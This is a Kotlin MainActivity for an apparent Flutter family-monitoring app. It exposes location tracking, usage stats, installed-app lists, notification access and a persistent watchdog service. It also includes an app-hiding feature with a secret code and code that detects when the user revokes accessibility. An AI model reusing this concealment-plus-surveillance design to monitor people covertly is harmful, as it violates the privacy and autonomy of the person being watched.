package com.example.background

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * 🛡️ PRODUCTION MainActivity (v2)
 *
 * Fixes vs v1:
 *  1. Fixed inverted `isBatteryOptimized()` semantics
 *  2. Heavy operations (getInstalledApps, getAppUsage) on IO dispatcher
 *  3. try/catch on all Intent launches (OEM-specific ActivityNotFoundException)
 *  4. onResume() re-verifies watchdog alive
 *  5. EventChannel for accessibility revoked notifications
 *
 * Method Channels registered:
 *  1. watchdog_channel    — start/stop watchdog, OEM helpers, app hider
 *  2. location_channel    — fused location
 *  3. usage_channel       — screen time
 *  4. apps_channel        — installed apps + icons
 *  5. device_channel      — device info, battery, network, RAM, storage
 *  6. permissions_channel — runtime permission flow
 *
 * Event Channels:
 *  1. accessibility_events — broadcasts ACCESSIBILITY_REVOKED to Flutter
 */
class MainActivity : FlutterActivity() {

    private val TAG = "MAIN_ACTIVITY"

    // Channels
    private lateinit var watchdogChannel: MethodChannel
    private lateinit var locationChannel: MethodChannel
    private lateinit var usageChannel: MethodChannel
    private lateinit var appsChannel: MethodChannel
    private lateinit var deviceChannel: MethodChannel
    private lateinit var permissionsChannel: MethodChannel
    private lateinit var accessibilityEventChannel: EventChannel

    // IO scope for heavy operations
    private val ioScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Providers (lazy init)
    private val locationProvider by lazy { LocationProvider(this) }
    private val usageStatsProvider by lazy { UsageStatsProvider(this) }
    private val appsProvider by lazy { AppsProvider(this) }
    private val deviceInfoProvider by lazy { DeviceInfoProvider(this) }

    // Accessibility event sink (Flutter → native)
    private var accessibilitySink: EventChannel.EventSink? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        setupWatchdogChannel(flutterEngine)
        setupLocationChannel(flutterEngine)
        setupUsageChannel(flutterEngine)
        setupAppsChannel(flutterEngine)
        setupDeviceChannel(flutterEngine)
        setupPermissionsChannel(flutterEngine)
        setupAccessibilityEventChannel(flutterEngine)

        // 🔥 Register receiver for accessibility revoked broadcast
        registerAccessibilityRevokedReceiver()
    }

    // ============ WATCHDOG CHANNEL ============
    private fun setupWatchdogChannel(flutterEngine: FlutterEngine) {
        watchdogChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "watchdog_channel"
        )

        watchdogChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "startWatchdog" -> {
                    WatchdogService.start(this)
                    result.success(true)
                }
                "stopWatchdog" -> {
                    stopService(Intent(this, WatchdogService::class.java))
                    result.success(true)
                }
                "setUserId" -> {
                    val uid = call.argument<String>("uid")
                    FirestoreClient.setUserId(uid)
                    getSharedPreferences("carecircle_prefs", Context.MODE_PRIVATE)
                        .edit()
                        .putString("currentUserId", uid)
                        .apply()
                    Log.d(TAG, "✅ User ID set: $uid")
                    result.success(true)
                }
                "isAccessibilityEnabled" -> {
                    result.success(AccessibilityWatchdogService.isEnabled(this))
                }
                "openAccessibilitySettings" -> {
                    val success = tryStartActivity(
                        Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                    )
                    result.success(success)
                }
                "isBatteryOptimized" -> {
                    // 🔥 FIX: Return TRUE if device is OPTIMIZING (i.e., killing) the app
                    result.success(!isIgnoringBatteryOptimizations())
                }
                "requestIgnoreBatteryOptimization" -> {
                    requestIgnoreBatteryOptimization()
                    result.success(true)
                }
                // ============ OEM AUTOSTART METHODS ============
                "openAutoStartSettings" -> {
                    result.success(AutoStartHelper.openAutoStartSettings(this))
                }
                "openBatteryOptimizationSettings" -> {
                    result.success(AutoStartHelper.openBatteryOptimizationSettings(this))
                }
                "requestIgnoreBatteryOptimizationDirect" -> {
                    result.success(AutoStartHelper.requestIgnoreBatteryOptimization(this))
                }
                "needsAutoStartPermission" -> {
                    result.success(AutoStartHelper.needsAutoStartPermission())
                }
                "getOEMFamily" -> {
                    result.success(AutoStartHelper.getOEMFamily().name)
                }
                "getOEMDisplayName" -> {
                    result.success(AutoStartHelper.getOEMDisplayName())
                }
                "getManufacturer" -> {
                    result.success(AutoStartHelper.getManufacturer())
                }
                // ============ APP HIDING METHODS ============
                "hideApp" -> {
                    result.success(AppHider.hideApp(this))
                }
                "unhideApp" -> {
                    result.success(AppHider.unhideApp(this))
                }
                "isAppHidden" -> {
                    result.success(AppHider.isHidden(this))
                }
                "getSecretCode" -> {
                    result.success(AppHider.SECRET_CODE_FORMATTED)
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ LOCATION CHANNEL ============
    private fun setupLocationChannel(flutterEngine: FlutterEngine) {
        locationChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "location_channel"
        )

        locationChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "getLocation" -> {
                    locationProvider.getCurrentLocation(
                        highAccuracy = call.argument<Boolean>("highAccuracy") ?: true,
                        timeoutMs = call.argument<Int>("timeoutMs") ?: 10000
                    ) { locationData, error ->
                        if (error != null) {
                            result.error("LOCATION_ERROR", error, null)
                        } else {
                            result.success(locationData)
                        }
                    }
                }
                "getLastKnownLocation" -> {
                    locationProvider.getLastKnownLocation { locationData, error ->
                        if (error != null) {
                            result.error("LOCATION_ERROR", error, null)
                        } else {
                            result.success(locationData)
                        }
                    }
                }
                "startLocationUpdates" -> {
                    locationProvider.startLocationUpdates(
                        intervalMs = call.argument<Long>("intervalMs") ?: 60_000L
                    ) { locationData ->
                        locationChannel.invokeMethod("onLocationUpdate", locationData)
                    }
                    result.success(true)
                }
                "stopLocationUpdates" -> {
                    locationProvider.stopLocationUpdates()
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ USAGE STATS CHANNEL ============
    private fun setupUsageChannel(flutterEngine: FlutterEngine) {
        usageChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "usage_channel"
        )

        usageChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "isUsageStatsEnabled" -> {
                    result.success(usageStatsProvider.hasPermission())
                }
                "openUsageStatsSettings" -> {
                    val success = tryStartActivity(
                        Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                    )
                    result.success(success)
                }
                "getAppUsage" -> {
                    val startMs = call.argument<Long>("startMs") ?: 0L
                    val endMs = call.argument<Long>("endMs") ?: System.currentTimeMillis()
                    // 🔥 Heavy op — IO dispatcher
                    ioScope.launch {
                        val data = usageStatsProvider.getAppUsage(startMs, endMs)
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getTodayUsage" -> {
                    ioScope.launch {
                        val data = usageStatsProvider.getTodayUsage()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getScreenEvents" -> {
                    val startMs = call.argument<Long>("startMs") ?: 0L
                    val endMs = call.argument<Long>("endMs") ?: System.currentTimeMillis()
                    ioScope.launch {
                        val data = usageStatsProvider.getScreenEvents(startMs, endMs)
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ APPS CHANNEL ============
    private fun setupAppsChannel(flutterEngine: FlutterEngine) {
        appsChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "apps_channel"
        )

        appsChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "getInstalledApps" -> {
                    val withIcons = call.argument<Boolean>("withIcons") ?: false
                    val excludeSystem = call.argument<Boolean>("excludeSystem") ?: true
                    // 🔥 CRITICAL: Apps enumeration + base64 icons on IO thread
                    ioScope.launch {
                        try {
                            val apps = appsProvider.getInstalledApps(withIcons, excludeSystem)
                            withContext(Dispatchers.Main) { result.success(apps) }
                        } catch (e: Exception) {
                            withContext(Dispatchers.Main) {
                                result.error("APPS_ERROR", e.message, null)
                            }
                        }
                    }
                }
                "getAppIcon" -> {
                    val pkg = call.argument<String>("packageName")
                    if (pkg.isNullOrEmpty()) {
                        result.error("INVALID", "packageName required", null)
                    } else {
                        ioScope.launch {
                            val icon = appsProvider.getAppIconBase64(pkg)
                            withContext(Dispatchers.Main) { result.success(icon) }
                        }
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ DEVICE INFO CHANNEL ============
    private fun setupDeviceChannel(flutterEngine: FlutterEngine) {
        deviceChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "device_channel"
        )

        deviceChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "getDeviceInfo" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getDeviceInfo()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getBatteryInfo" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getBatteryInfo()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getNetworkInfo" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getNetworkInfo()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getStorageInfo" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getStorageInfo()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getMemoryInfo" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getMemoryInfo()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                "getAll" -> {
                    ioScope.launch {
                        val data = deviceInfoProvider.getAll()
                        withContext(Dispatchers.Main) { result.success(data) }
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ PERMISSIONS CHANNEL ============
    private fun setupPermissionsChannel(flutterEngine: FlutterEngine) {
        permissionsChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "permissions_channel"
        )

        permissionsChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "isAllPermissionsGranted" -> {
                    result.success(deviceInfoProvider.checkAllPermissions())
                }
                "openAppSettings" -> {
                    val success = tryStartActivity(
                        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.fromParts("package", packageName, null)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                    )
                    result.success(success)
                }
                "openOverlaySettings" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        val success = tryStartActivity(
                            Intent(
                                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:$packageName")
                            ).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
                        )
                        result.success(success)
                    } else {
                        result.success(true)
                    }
                }
                "hasOverlayPermission" -> {
                    result.success(
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            Settings.canDrawOverlays(this)
                        } else true
                    )
                }
                "isNotificationAccessEnabled" -> {
                    result.success(CareCircleNotificationListener.isEnabled(this))
                }
                "openNotificationAccessSettings" -> {
                    CareCircleNotificationListener.openSettings(this)
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }
    }

    // ============ ACCESSIBILITY EVENT CHANNEL ============
    private fun setupAccessibilityEventChannel(flutterEngine: FlutterEngine) {
        accessibilityEventChannel = EventChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            "accessibility_events"
        )

        accessibilityEventChannel.setStreamHandler(object : EventChannel.StreamHandler {
            override fun onListen(arguments: Any?, sink: EventChannel.EventSink?) {
                accessibilitySink = sink
                Log.d(TAG, "🎧 Flutter listening to accessibility events")
            }

            override fun onCancel(arguments: Any?) {
                accessibilitySink = null
                Log.d(TAG, "🎧 Flutter stopped listening")
            }
        })
    }

    /**
     * 🔥 Register receiver for ACCESSIBILITY_REVOKED broadcast from native services
     */
    private fun registerAccessibilityRevokedReceiver() {
        AccessibilityRevokedReceiver.sinkCallback = { event ->
            Log.d(TAG, "📡 Forwarding to Flutter: $event")
            accessibilitySink?.success(event)
        }
        Log.d(TAG, "✅ Accessibility revoked receiver callback registered")
    }

    // ============ Helpers ============

    /**
     * Safe Intent launch — catches ActivityNotFoundException (OEM-specific paths)
     */
    private fun tryStartActivity(intent: Intent): Boolean {
        return try {
            startActivity(intent)
            true
        } catch (e: android.content.ActivityNotFoundException) {
            Log.e(TAG, "Activity not found: ${intent.action} — ${e.message}")
            false
        } catch (e: Exception) {
            Log.e(TAG, "Intent launch failed: ${intent.action} — ${e.message}")
            false
        }
    }

    /**
     * 🔥 FIX: Correct semantics — returns TRUE if app is exempt from battery optimization
     */
    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isIgnoringBatteryOptimizations(packageName)
        } else true
    }

    private fun requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    ).apply {
                        data = Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Battery opt request failed: ${e.message}")
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        WatchdogService.start(this)
    }

    /**
     * 🔥 NEW: Re-verify watchdog alive on every app resume
     */
    override fun onResume() {
        super.onResume()
        if (!WatchdogService.isRunning(this)) {
            Log.d(TAG, "🔄 WatchdogService not running — restarting on resume")
            WatchdogService.start(this)
        }
    }

    override fun onDestroy() {
        AccessibilityRevokedReceiver.sinkCallback = null  // 🔥 Clear callback
        super.onDestroy()
        ioScope.cancel()  // 🔥 Cancel all coroutines
    }

//    private fun CoroutineScope.cancel() {
//        kotlinx.coroutines.cancel(this)
//    }
}